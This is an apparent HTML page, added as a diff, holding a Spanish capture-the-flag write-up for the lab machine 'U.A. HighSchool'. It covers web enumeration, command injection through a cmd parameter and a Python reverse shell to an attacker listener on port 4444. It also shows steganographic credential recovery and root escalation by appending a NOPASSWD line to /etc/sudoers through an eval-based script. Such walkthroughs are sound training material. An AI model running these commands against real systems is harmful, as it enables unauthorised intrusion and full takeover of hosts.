@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>U.A. HighSchool - Flag Colector</title>
+    <link rel="stylesheet" href="../assets/writeup.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="writeup-container">
+        <!-- Encabezado con metadatos -->
+        <div class="writeup-header">
+            <h1><i class="fas fa-skull"></i>U.A.HighSchool</h1>
+            <div class="machine-meta">
+                <span class="meta-item"><i class="fas fa-network-wired"></i>10.10.204.93</span>
+                <span class="meta-item os linux"><i class="fab fa-linux"></i>Linux</span>
+                <span class="meta-item difficulty easy"><i class="fas fa-bolt"></i>Fácil</span>
+            </div>
+        </div>
+
+        <!-- Sección de Enumeración -->
+        <section class="writeup-section">
+            <h2><i class="fas fa-search"></i> Enumeración Web</h2>
+            
+            <div class="finding">
+                <h3>Nmap</h3>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>sudo nmap -sC -sV 10.10.204.93</code>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4>Resultado:</h4>
+                    <p>PORT STATE SERVICE VERSION<br><br>
+                        22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+                        | ssh-hostkey:
+                            3072 58:12:f5:ec:12:3b:a9:fe:81:8a:8e:2d:d8:91:21:d2:76 (RSA)
+                            256 54:1f:20:5f:d:7c:f3:24:62:47:8a:fb:8a:b2:29:c2:bb (ECDSA)
+                            256 62:16:f8:c9:60:0f:70:1f:6a:11:ab:a8:33:79:b5:5d (ED25519)<br><br>
+                        80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
+                        |_http-server-header: Apache/2.4.41 (Ubuntu)
+                        |_http-title: U.A. High School
+                        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
+                </div>
+
+                <div class="discovery-box">
+                    <h4>Características detectadas:</h4>
+                    <ul class="findings-list">
+                        <li>Puerto 22: Servidor OpenSSH (8.2p1)</li>
+                        <li>Puerto 80: Servidor Web Apache (2.4.41)</li>
+                    </ul>
+                </div>
+                
+                <h3>Acceso al portarl web (Puerto 80)</h3>
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>http://10.10.204.93:80</code>
+                </div>
+                
+        
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../U.A.HighSchool/img/foto1.png" alt="Panel de administración Tentacle" class="writeup-image">
+                    <p class="image-caption">Figura 1: Portal Web</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Si inspeccionamos el contenido de la web veremos que existe una carpeta assets</p>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../U.A.HighSchool/img/foto2.png" alt="Panel de administración Tentacle" class="writeup-image">
+                    <p class="image-caption">Figura 2: Identificación de la carpeta /assets</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>si accedemos a ella veremos una web en blaco: http://10.10.204.93/assets/</p>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../U.A.HighSchool/img/foto3.png" alt="Panel de administración Tentacle" class="writeup-image">
+                    <p class="image-caption">Figura 3: Acceso a http://10.10.204.93/assets/</p>
+                </div>
+
+                <div class="finding">
+                    <h3>Enumeración con Gobuster</h3>
+    
+                    <div class="command-box">
+                        <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                        <code>gobuster dir -u http://10.0.2.6/assets -w /usr/share/seclists/Discovery/Web-Content/common.txt</code>
+                    </div>
+
+                    <!-- Imagen -->
+                    <div class="image-box">
+                        <img src="../U.A.HighSchool/img/foto4.png" alt="Panel de administración Tentacle" class="writeup-image">
+                        <p class="image-caption">Figura 4: Enumeración web con Gobuster</p>
+                    </div>
+    
+                    <div class="discovery-box">
+                        <h4>Veremos dos URLs accesibles: </h4>
+                        <ul class="findings-list">
+                            <li>http://10.10.204.93/assets/images</li>
+                            <li>http://10.10.204.93/assets/index.php</li>
+                            <p>(La que nos interesa es la segunda URL)</p>
+                        </ul>
+                    </div>
+
+                    <!-- Imagen -->
+                    <div class="image-box">
+                        <img src="../U.A.HighSchool/img/foto5.png" alt="Panel de administración Tentacle" class="writeup-image">
+                        <p class="image-caption">Figura 5: Acceso a http://10.10.204.93/assets/index.php</p>
+                    </div>
+
+                    <div class="discovery-box-standard">
+                        <h4></h4>
+                        <p>En la primera URL no encontraremos nada, pero en cambio en la segunda URL veremos que está vacía, pero vamos a modificar la URL para intentar ejecutar comandos</p>
+                    </div>
+
+                    <div class="command-box">
+                        <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                        <code>http://10.10.204.93/assets/index.php?cmd=whoami</code>
+                    </div>
+
+                    <!-- Imagen -->
+                    <div class="image-box">
+                        <img src="../U.A.HighSchool/img/foto6.png" alt="Panel de administración Tentacle" class="writeup-image">
+                        <p class="image-caption">Figura 6: modificación URL para insertar un cmd</p>
+                    </div>
+
+                    <div class="discovery-box-standard">
+                        <h4></h4>
+                        <p>Obtendremos la respuesta en Base64, por lo tanto debemos decodificarla, para ello usaremos la terminal con el siguiente comando:</p>
+                    </div>
+
+                    <div class="command-box">
+                        <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                        <code>echo "d3d3LWRhdGEK" | base64 -d</code>
+                    </div>
+
+                    <div class="discovery-box-standard">
+                        <h4>Resultado:</h4>
+                        <p>www-data <br><br>
+                        (Esto nos da a entender que somos el usuario www-data)</p>
+                    </div>
+            </div>
+        </section>
+
+        <!-- Sección de Explotación -->
+        <section class="writeup-section">
+            <h2><i class="fas fa-bug"></i>Explotación</h2>
+            
+            <div class="exploit-step">
+                <h3>Reverse Shell</h3>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Intentaremos establecer una revershell creandola con https://www.revshells.com/</p>
+                </div>
+                
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.2.107",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")' </code>
+                </div>
+                
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../U.A.HighSchool/img/foto7.png" alt="Panel de administración Tentacle" class="writeup-image">
+                    <p class="image-caption">Figura 7: modificación URL para insertar una Reverse Shell</p>
+                </div>
+                
+                <div class="discovery-box warning">
+                    <h4><i class="fas fa-exclamation-triangle"></i> Antes de ejecutarlo debemos abrir un servidor a la escucha con netcat</h4>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>nc -lvnp 4444</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../U.A.HighSchool/img/foto8.png" alt="Panel de administración Tentacle" class="writeup-image">
+                    <p class="image-caption">Figura 8: Conexión de la Reverse Shell</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Con la conexión establecida debemos dirigirnos a /var/www/Hidden_Content y allí encontraremos un archivo llamado passphrase.txt</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>cd /var/www/Hidden_Content</code>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>cat passphrase.txt</code>
+                </div>
+                
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../U.A.HighSchool/img/foto9.png" alt="Panel de administración Tentacle" class="writeup-image">
+                    <p class="image-caption">Figura 9: Acceso a la ruta: /var/www/Hidden_Content</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Obtendremos una cadena en Base64, por lo tanto debemos decodificarla, para ello usaremos la terminal con el siguiente comando:</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>echo "QWxsbWlnaHRGb3JFdmVyISEhCg==" | base64 -d</code>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4>Resultado:</h4>
+                    <p>AllmightForEver!!!</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Ahora nos dirigimos a esta ruta: /var/www/html/assets/images <br> (En esta ruta veremos dos imágenes)</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>cd /var/www/html/assets/images</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../U.A.HighSchool/img/foto10.png" alt="Panel de administración Tentacle" class="writeup-image">
+                    <p class="image-caption">Figura 10: Acceso a la ruta: /var/www/html/assets/images</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Exportamos las imágenes con el comando wget</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>wget http://10.10.204.93/assets/images/oneforall.jpg  </code>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>wget http://10.10.204.93/assets/images/yuei.jpg  </code>
+                </div>
+
+                <div class="discovery-box warning">
+                    <h4><i class="fas fa-exclamation-triangle"></i>La única que nos interesa realmente es oneforall.jpg</h4>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../U.A.HighSchool/img/foto11.png" alt="Panel de administración Tentacle" class="writeup-image">
+                    <p class="image-caption">Figura 11: Descargamos la imágen oneforall.jpg</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>La foto oneforall.jpg está corrupta, así que debermos arreglarla usando la herramienta MagicBytes:</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>https://github.com/Haxrein/MagicBytes</code>
+                </div>
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>git clone https://github.com/Haxrein/MagicBytes.git</code>
+                </div>
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>cd /MagicBytes</code>
+                </div>
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>python3 magicbytes.py -i oneforall.jpg -m jpg</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../U.A.HighSchool/img/foto12.png" alt="Panel de administración Tentacle" class="writeup-image">
+                    <p class="image-caption">Figura 12: Utiización de MagicBytes</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Veremos que la imagen oneforall.jpg ahora es accesible</p>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../U.A.HighSchool/img/foto13.png" alt="Panel de administración Tentacle" class="writeup-image">
+                    <p class="image-caption">Figura 13: oneforall.jpg</p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Ahora podemos usar Steghide y encontrar una pista secreta en la imágen oneforall.jpg:
+                    </p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>sudo apt update</code>
+                </div>
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>sudo apt install steghide</code>
+                </div>
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>steghide extract -sf oneforall.jpg</code>
+                </div>
+                <div class="discovery-box warning">
+                    <h4><i class="fas fa-exclamation-triangle"></i>Nos pedirá una contraseña: AllmightForEver!!!
+                    </h4>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4>Resultado:</h4>
+                    <p>steghide extract -sf oneforall.jpg<br>    
+                        Enter passphrase:<br>  
+                        wrote extracted data to "creds.txt".
+                    </p>
+                </div>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Esto nos exporta un fichero creds.txt, el cual podremos visualizar sin problemas, este fichero contiene las credenciales de acceso SSH</p>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../U.A.HighSchool/img/foto14.png" alt="Panel de administración Tentacle" class="writeup-image">
+                    <p class="image-caption">Figura 14: creds.txt</p>
+                </div>
+
+                <h3>Acceso SSH</h3>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Con las credenciales obtenidas anteriormente, procedemos a establecer una conexión SSH con la máquina objetivo</p>
+                </div>
+                
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>ssh deku@10.10.204.93</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../U.A.HighSchool/img/foto15.png" alt="Panel de administración Tentacle" class="writeup-image">
+                    <p class="image-caption">Figura 15: Acceso por SSH</p>
+                </div>
+
+                <h3>User Flag</h3>
+
+                <div class="discovery-box-standard">
+                    <h4></h4>
+                    <p>Una vez establecida la conexión SSH podremos ver la user flag (user.txt)</p>
+                </div>
+
+                <div class="command-box">
+                    <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                    <code>cat user.txt</code>
+                </div>
+
+                <!-- Imagen -->
+                <div class="image-box">
+                    <img src="../U.A.HighSchool/img/foto16.png" alt="Panel de administración Tentacle" class="writeup-image">
+                    <p class="image-caption">Figura 16: User Flag (user.txt)</p>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- Sección de Escalada de Privilegios -->
+        <section class="writeup-section">
+            <h2><i class="fas fa-user-shield"></i> Escalada de Privilegios</h2>
+
+            <div class="discovery-box-standard">
+                <h4></h4>
+                <p>Ejecutamos sudo -l y nos desplazamos al archivo feedback.sh en /opt ya que es donde tenemos privilegios</p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>sudo -l</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../U.A.HighSchool/img/foto17.png" alt="Panel de administración Tentacle" class="writeup-image">
+                <p class="image-caption">Figura 17: Privilegios sobre feedback.sh</p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>cat /opt/NewComponent/feedback.sh</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../U.A.HighSchool/img/foto18.png" alt="Panel de administración Tentacle" class="writeup-image">
+                <p class="image-caption">Figura 18: Contenido de feedback.sh</p>
+            </div>
+
+            <h3>Desglose de feedback.sh</h3>
+
+            <div class="discovery-box">
+                <h4>Características detectadas:</h4>
+                <ul>
+                    <li>Muestra un mensaje de bienvenida.</li><br>
+                    <li>Pide al usuario que escriba un feedback.</li><br>
+                    <li>Revisa si el input contiene símbolos peligrosos como: <code>`, ), $(, |, &, ;, ?, !, \</code></li><br>
+                    <li>
+                        Si no tiene esos símbolos:
+                        <ul>
+                            <li>Lo imprime usando eval (¡peligroso!).</li>
+                            <li>Lo guarda en <code>/var/log/feedback.txt</code>.</li>
+                            <li>Muestra "Feedback successfully saved."</li><br>
+                        </ul>
+                    </li>
+                    <li>
+                        Si sí tiene símbolos peligrosos:
+                        <ul>
+                            <li>Muestra "Invalid input."</li>
+                        </ul>
+                    </li>
+                </ul>
+            </div>
+
+            <div class="discovery-box warning">
+                <h4><i class="fas fa-exclamation-triangle"></i>Nos centraremos en la sección "Eval", aquí es donde podemos hacer la actualización de autorización.
+                </h4>
+            </div>
+
+            <div class="discovery-box-standard">
+                <h4></h4>
+                <p>Usaremos este código para el feedback y así poder modificar el fichero /etc/sudoers: </p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>sudo /opt/NewComponent/feedback.sh</code>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>deku ALL=NOPASSWD: ALL >> /etc/sudoers</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../U.A.HighSchool/img/foto19.png" alt="Panel de administración Tentacle" class="writeup-image">
+                <p class="image-caption">Figura 19: Explotación de feedback.sh</p>
+            </div>
+
+            <div class="discovery-box-standard">
+                <h4></h4>
+                <p>Si probamos sudo -l con el usuario deku veremos que ahora si pertenecemos al grupo de root</p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>sudo -l</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../U.A.HighSchool/img/foto20.png" alt="Panel de administración Tentacle" class="writeup-image">
+                <p class="image-caption">Figura 20: El usuario deku quedará establecido como root</p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>sudo su</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../U.A.HighSchool/img/foto21.png" alt="Panel de administración Tentacle" class="writeup-image">
+                <p class="image-caption">Figura 21: El usuario deku podrá elevar sus privilegios a root</p>
+            </div>
+
+            <h3>Root Flag</h3>
+
+            <div class="discovery-box-standard">
+                <h4></h4>
+                <p>Una vez establecidos como root veremos que podremos acceder a la root flag (root.txt)</p>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>cd /root</code>
+            </div>
+
+            <div class="command-box">
+                <button class="copy-btn" onclick="copyToClipboard(this)"><i class="far fa-copy"></i></button>
+                <code>cat root.txt</code>
+            </div>
+
+            <!-- Imagen -->
+            <div class="image-box">
+                <img src="../U.A.HighSchool/img/foto22.png" alt="Panel de administración Tentacle" class="writeup-image">
+                <p class="image-caption">Figura 22: User Flag (user.txt)</p>
+            </div>
+
+        </section>
+    </div>
+
+    
+
+    <script src="../assets/scripts/copy.js" defer></script>
+</body>
+</html>
